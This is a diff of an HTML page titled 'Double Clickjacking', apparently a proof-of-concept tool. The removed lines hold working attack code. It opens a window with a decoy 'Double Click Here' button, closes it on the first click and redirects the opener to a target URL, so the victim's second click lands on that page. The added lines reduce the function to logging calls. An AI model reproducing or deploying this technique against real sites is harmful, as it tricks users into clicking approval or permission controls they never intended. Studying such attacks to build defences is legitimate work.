@@ -1,66 +1,28 @@
 <html>
     <head>
-        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+          <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
     </head>
 <body>
 <script>
-    function openDoubleWindow(url, upDown) {
-        console.log("hi from openDoubleWindow");
-        console.log('url opendoublewindow', url);
-        console.log('updown opendoublewindow', upDown);
-        
-        var evilWindow = window.open(window.location.protocol + "//" +
-            window.location.hostname + ":" + window.location.port + "/random", "_blank");
-
-        evilWindow.onload = function() {
-            evilWindow.document.open();
-
-            // Plugs the page to be hijacked as the opener returnee
-            evilWindow.document.write(`
-                <script>
-                setTimeout(function() { 
-                    opener.location = "${url}"; 
-                }, 1000);
-                </script>
-
-                <div id="doubleclick" type="button" class="button" 
-                    style="top: ${upDown === 'Up' ? '10px' : '100px'}; left: 50px; width: 200px; height: 50px; 
-                    position: absolute; font-size: 16px; color: white; background-color: #3498db; box-shadow: 
-                    5px 5px 10px rgba(0, 0, 0, 0.3); display: flex; justify-content: center; align-items: center; 
-                    font-weight: bold; text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); cursor: pointer; border-radius: 
-                    20px; text-align: center; padding: 0 5px; transition: all 0.3s ease;" 
-                    onmouseover="this.style.backgroundColor='#2980b9'; this.style.boxShadow='6px 6px 12px rgba(0, 0, 0, 0.4)'; 
-                    this.style.transform='scale(1.05)';" 
-                    onmouseout="this.style.backgroundColor='#3498db'; this.style.boxShadow='5px 5px 10px rgba(0, 0, 0, 0.3)'; 
-                    this.style.transform='scale(1)';">Double Click Here</div>
-
-                <script>
-                document.getElementById('doubleclick').addEventListener('mousedown', function() {
-                    window.close();
-                });
-                </script>
-            `);
-
-            evilWindow.document.close();
-        };
+    function openDoubleWindow(url,upDown){
+        console.log("hi from opendoublewindow");
+        console.log('url opendoublewindow',url);
+        console.log('updown opendoublewindow',upDown);
     }
-
     function getValuesFromForm(event) {
-        event.preventDefault(); // Prevent form submission
+        event.preventDefault();
         const urlInput = document.getElementById("siteUrl").value;
         const upDown = document.getElementById("Updown").value;
-        
         if (urlInput && upDown) {
             console.log('URL:', urlInput);
             console.log('Top (Up/Down):', upDown);
-            openDoubleWindow(urlInput, upDown);
+            openDoubleWindow(urlInput,upDown);
         } else {
             console.error('Both URL and Up/Down values are required.');
         }
     }
 </script>
-
-<form>
+    <form>
     <h2><b>Double Clickjacking</b></h2>
     <div class="form-row">
         <div class="form-group col-md-6">
@@ -74,8 +36,7 @@
             <input type="text" class="form-control" id="Updown" placeholder="Up/Down" />
         </div>
     </div>
-    <button type="button" onclick="getValuesFromForm(event)" class="btn btn-primary">Click here</button>
-</form>
-
+        <button onclick="getValuesFromForm(event)" class="btn btn-primary">Click here</button>
+    </form>
 </body>
 </html>
